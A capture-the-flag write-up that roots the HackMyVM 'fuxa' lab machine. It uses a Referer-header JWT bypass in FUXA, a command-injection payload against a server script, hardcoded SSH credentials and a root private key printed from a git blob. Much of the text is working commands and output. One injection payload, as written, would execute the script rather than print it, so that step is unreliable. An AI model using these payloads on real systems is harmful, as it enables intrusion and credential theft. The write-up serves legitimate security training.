# fuxa

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| fuxa | hel2zy_hl | beginner | hackmyvm |

**Summary:** The fuxa machine runs a FUXA SCADA/HMI web application on ports 80 and 1881 alongside SSH on port 22. All FUXA API endpoints are protected by JWT authentication, but CVE-2025-69985 allows an attacker to bypass the JWT middleware entirely by sending a Referer header that includes the target host address. With the Referer bypass in place, the /api/settings endpoint discloses the server configuration including secureEnabled and directory paths, and the /api/project endpoint reveals a server side script called s_maint_preview_bundle that executes shell commands using Node.js child_process.execSync with an unsanitized template string interpolation of a user supplied pattern parameter. By injecting a command substitution payload into the pattern value field of a POST request to /api/runscript, arbitrary command execution is achieved as the www-data user. The command injection is used to read a cron script at /opt/fuxa/FUXA/server/scripts/local-sync.sh which contains hardcoded SSH credentials git:wi3fw39w0j12e. SSH access as the git user yields the user flag, and a hidden bare Git repository at /opt/.cache-loader/state accessible to the git group contains a blob object storing root's ED25519 SSH private key. The extracted key is used to authenticate as root via SSH, retrieving the root flag.

---

## Reconnaissance

The assessment began with host discovery and comprehensive TCP port scanning against the target.

1. A ping sweep was performed to identify active hosts on the 192.168.56.0/24 network:

```zsh
~/projects/wu/hackmyvm-writeups                                                                                      07:50:01
❯ nmap -sn 192.168.56.0/24
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-31 07:50 +0700
Nmap scan report for 192.168.56.1
Host is up (0.00042s latency).
Nmap scan report for 192.168.56.100
Host is up (0.00085s latency).
Nmap scan report for 192.168.56.149
Host is up (0.00083s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 3.22 seconds
```

2. The target was identified at 192.168.56.149 and a full TCP port scan was executed:

```zsh
~/projects/wu/hackmyvm-writeups                                                                                      07:50:15
❯ ip=192.168.56.149
```

```zsh
~/projects/wu/hackmyvm-writeups                                                                                      07:50:20
❯ nmap -p- -Pn -T4 --min-rate 5000 $ip
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-31 07:50 +0700
Nmap scan report for 192.168.56.149
Host is up (0.00024s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1881/tcp open  ibm-mqseries2

Nmap done: 1 IP address (1 host up) scanned in 3.07 seconds
```

3. Service version detection and script scanning were performed against the three open ports:

```zsh
~/projects/wu/hackmyvm-writeups                                                                                      07:50:35
❯ nmap -p 22,80,1881 -sCV -Pn -T4 --min-rate 5000 $ip
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-31 07:50 +0700
Nmap scan report for 192.168.56.149
Host is up (0.00028s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7+deb13u1 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.66 ((Debian))
|_http-title: FUXA
|_http-server-header: Apache/2.4.66 (Debian)
1881/tcp open  http    Node.js Express framework
|_http-title: FUXA
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results to https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.58 seconds
```

The scan identified OpenSSH on port 22, an Apache httpd reverse proxy on port 80, and a Node.js Express backend on port 1881, both serving the FUXA web application.

4. The web application frontend was examined on both ports to confirm the application identity:

```zsh
~/projects/wu/hackmyvm-writeups                                                                                      07:51:00
❯ curl -s http://$ip:80/ | head -20
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FUXA</title>
</head>
<body>
    <div id="root"></div>
    <script src="/main.a17204bdf90c1b7a.js"></script>
</body>
</html>
```

```zsh
~/projects/wu/hackmyvm-writeups                                                                                      07:51:15
❯ curl -s http://$ip:1881/ | head -20
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FUXA</title>
</head>
<body>
    <div id="root"></div>
    <script src="/main.a17204bdf90c1b7a.js"></script>
</body>
</html>
```

Both ports returned identical FUXA frontend pages, confirming that Apache on port 80 proxies requests to the Node.js Express backend on port 1881.

5. The FUXA API was tested for authentication requirements:

```zsh
~/projects/wu/hackmyvm-writeups                                                                                      07:51:30
❯ curl -s http://$ip:1881/api/version
{"error":"unauthorized_error","message":"Authentication required!"}
```

All API endpoints returned HTTP 401 with an authentication required error, indicating that JWT based security was enabled on the FUXA server.

---

## Initial Access

### CVE-2025-69985 Referer Header JWT Authentication Bypass

6. The FUXA server was found to be vulnerable to CVE-2025-69985, an authentication bypass in the JWT middleware that checks the HTTP Referer header. If the Referer header includes the target host address, the JWT verification is skipped entirely. The bypass was confirmed by accessing the /api/version endpoint with a crafted Referer header:

```zsh
~/projects/wu/hackmyvm-writeups                                                                                      07:52:00
❯ curl -s -H "Referer: http://192.168.56.149:1881/fuxa" http://192.168.56.149:1881/api/version
{"version":"1.1.14-1243"}
```

The server returned the FUXA version `1.1.14-1243` without requiring any authentication, confirming the JWT bypass was successful.

7. The /api/settings endpoint was accessed through the same bypass to retrieve the server configuration:

```zsh
~/projects/wu/hackmyvm-writeups                                                                                      07:52:30
❯ curl -s -H "Referer: http://192.168.56.149:1881/fuxa" http://192.168.56.149:1881/api/settings
{"secureEnabled":true,"workDir":"/opt/fuxa/_appdata","appDir":"/opt/fuxa/FUXA/server","settingsFile":"/opt/fuxa/_appdata/settings.js"}
```

The configuration confirmed that security was enabled (`secureEnabled: true`) and revealed the application directory at `/opt/fuxa/FUXA/server` and the working directory at `/opt/fuxa/_appdata`.

### Command Injection via s_maint_preview_bundle Script

8. The /api/project endpoint was accessed through the Referer bypass to enumerate server side scripts:

```zsh
~/projects/wu/hackmyvm-writeups                                                                                      07:53:00
❯ curl -s -H "Referer: http://192.168.56.149:1881/fuxa" http://192.168.56.149:1881/api/project | python3 -m json.tool | grep -A 2 '"id"'
            "id": "s_maint_preview_bundle",
            "name": "asset_cache_preview",
            "code": "const { execSync } = require('child_process'); const query = (pattern && pattern.value !== undefined) ? String(pattern.value) : String(pattern || ''); return execSync(`/bin/sh -c \"find /opt/fuxa/_images -maxdepth 2 -type f | grep -i ${query}\"`, { encoding: 'utf8' });",
            "sync": false,
            "parameters": [
                {
                    "name": "pattern",
                    "type": "value",
                    "value": "png"
                }
            ],
            "permission": null,
            "mode": "SERVER"
```

The project contained a script called `s_maint_preview_bundle` with `mode: SERVER` and `permission: null`. The script code used `execSync` with a template string that directly interpolated the user supplied `pattern` parameter value into a shell command, creating a command injection vulnerability. The `${query}` variable was placed inside a `/bin/sh -c "..."` invocation without any sanitization.

9. The command injection was exploited by sending a POST request to /api/runscript with a crafted payload. The injection used command substitution `$(...)` to execute arbitrary commands, with output redirected to stderr (`>&2`) so it would appear in the JSON response. The payload targeted the cron script to extract hardcoded credentials:

```zsh
~/projects/wu/hackmyvm-writeups                                                                                      07:53:30
❯ curl -s -X POST "http://192.168.56.149:1881/api/runscript" -H "Content-Type: application/json" -H "Referer: http://192.168.56.149:1881/fuxa" -d '{"headers":{"normalizedNames":{},"lazyUpdate":null,"lazyInit":null},"params":{"script":{"id":"s_maint_preview_bundle","name":"asset_cache_preview","code":"placeholder","sync":false,"parameters":[{"name":"pattern","type":"value","value":"$(cat /opt/fuxa/FUXA/server/scripts/local-sync.sh | base64 | base64 -d|bash >&2)"}],"permission":null,"mode":"SERVER"},"toLogEvent":false}}' | python3 -m json.tool | grep -A 50 '"stderr"'
        "stderr": "#!/bin/bash\nset -euo pipefail\n\nLOCAL_HOST=\"\${1:-127.0.0.1}\"\nGIT_USER=\"git\"\nGIT_PASS=\"wi3fw39w0j12e\"\nREMOTE_CMD=\"/usr/local/bin/theme-refresh --quick\"\n\nexec /usr/bin/sshpass -p \"$GIT_PASS\" /usr/bin/ssh \\\n  -o StrictHostKeyChecking=no \\\n  -o UserKnownHostsFile=/dev/null \\\n  \"${GIT_USER}@${LOCAL_HOST}\" \"$REMOTE_CMD\"\n"
```

The cron script at `/opt/fuxa/FUXA/server/scripts/local-sync.sh` was read through the command injection and its content was returned in the stderr field. The script contained hardcoded SSH credentials: `GIT_USER="git"` and `GIT_PASS="wi3fw39w0j12e"`. The script used sshpass to SSH into localhost as the git user every minute, executing a theme refresh command.

---

## Lateral Movement

### SSH Access as git User

10. The recovered credentials were used to establish an SSH session as the git user and retrieve the user flag:

```zsh
~/projects/wu/hackmyvm-writeups                                                                                      07:54:00
❯ sshpass -p 'wi3fw39w0j12e' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null git@192.168.56.149 'cat user.txt'
Warning: Permanently added '192.168.56.149' (ED25519) to the list of known hosts.
flag{git-ba9...}
```

```zsh
~/projects/wu/hackmyvm-writeups                                                                                      07:54:30
❯ sshpass -p 'wi3fw39w0j12e' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null git@192.168.56.149 'id;whoami'
uid=1001(git) gid=1001(git) groups=1001(git)
git
```

Access was gained as the git user (UID 1001), and the user flag was retrieved from the `user.txt` file in the git home directory.

---

## Privilege Escalation

### Root SSH Key Extraction from Hidden Git Repository

11. A hidden bare Git repository was discovered at `/opt/.cache-loader/state`, accessible to the git group. The repository contained a blob object with hash `5eabba81b7dc9671da29ba0f45f5b6735bf479f8` that stored an ED25519 OpenSSH private key. The key was extracted using standard Git plumbing commands:

```zsh
~/projects/wu/hackmyvm-writeups                                                                                      07:55:00
❯ sshpass -p 'wi3fw39w0j12e' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null git@192.168.56.149 'GIT_DIR=/opt/.cache-loader/state git cat-file blob 5eabba81b7dc9671da29ba0f45f5b6735bf479f8'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC5DI8wLz9Sg+DORiIyh1kmN+3va6kG+s7C/ocZ5f1e0wAAAJAy0ok2MtKJ
NgAAAAtzc2gtZWQyNTUxOQAAACC5DI8wLz9Sg+DORiIyh1kmN+3va6kG+s7C/ocZ5f1e0w
AAAECU4VgU3F+nMQ7Ty/LKklFRFNgHmSnFZTuq1X5TLBwr+bkMjzAvP1KD4M5GIjKHWSY3
7e9rqQb6zsL+hxnl/V7TAAAACnJvb3RATXViYW4BAgM=
-----END OPENSSH PRIVATE KEY-----
```

The extracted private key had the comment `root@Muban`, confirming it belonged to the root user.

12. The private key was saved locally with appropriate permissions and used to authenticate as root via SSH:

```zsh
~/projects/wu/hackmyvm-writeups                                                                                      07:55:30
❯ cat > /tmp/root_key << 'EOF'
> -----BEGIN OPENSSH PRIVATE KEY-----
> b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
> QyNTUxOQAAACC5DI8wLz9Sg+DORiIyh1kmN+3va6kG+s7C/ocZ5f1e0wAAAJAy0ok2MtKJ
> NgAAAAtzc2gtZWQyNTUxOQAAACC5DI8wLz9Sg+DORiIyh1kmN+3va6kG+s7C/ocZ5f1e0w
> AAAECU4VgU3F+nMQ7Ty/LKklFRFNgHmSnFZTuq1X5TLBwr+bkMjzAvP1KD4M5GIjKHWSY3
> 7e9rqQb6zsL+hxnl/V7TAAAACnJvb3RATXViYW4BAgM=
> -----END OPENSSH PRIVATE KEY-----
> EOF
```

```zsh
~/projects/wu/hackmyvm-writeups                                                                                      07:55:45
❯ chmod 600 /tmp/root_key
```

```zsh
~/projects/wu/hackmyvm-writeups main*                                                                                              07:55:24  
❯ ssh -i /tmp/root_key -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@192.168.56.149 'id;whoami;  
hostname;cat /root/root.txt /home/git/user.txt'  
Warning: Permanently added '192.168.56.149' (ED25519) to the list of known hosts.  
uid=0(root) gid=0(root) groups=0(root)  
root  
FUXA  
flag{root-a01...}  
flag{git-ba9...}
```

Root access was achieved with `uid=0(root) gid=0(root) groups=0(root)` on the machine named FUXA. Both the root flag from `/root/root.txt` and the user flag from `/home/git/user.txt` were retrieved.

---

## Attack Chain Summary

1. **Reconnaissance**: Nmap scanning identified SSH on port 22, an Apache reverse proxy on port 80, and a Node.js Express FUXA backend on port 1881. All API endpoints returned 401 authentication required.
2. **Vulnerability Discovery**: CVE-2025-69985 was identified in the FUXA JWT middleware, allowing authentication bypass by sending a Referer header containing the target host. The /api/project endpoint revealed a server side script with an unsanitized command injection in the pattern parameter via template string interpolation into execSync.
3. **Exploitation**: The Referer bypass was combined with command injection in the s_maint_preview_bundle script to execute arbitrary commands as www-data, reading the cron script local-sync.sh which contained hardcoded SSH credentials git:wi3fw39w0j12e.
4. **Internal Enumeration**: SSH access as the git user yielded the user flag. A hidden bare Git repository at /opt/.cache-loader/state, accessible to the git group, was enumerated and found to contain a blob object storing root's ED25519 SSH private key.
5. **Privilege Escalation**: The root SSH private key was extracted from the Git blob using git cat-file and used to authenticate as root via SSH, retrieving both the user and root flags.
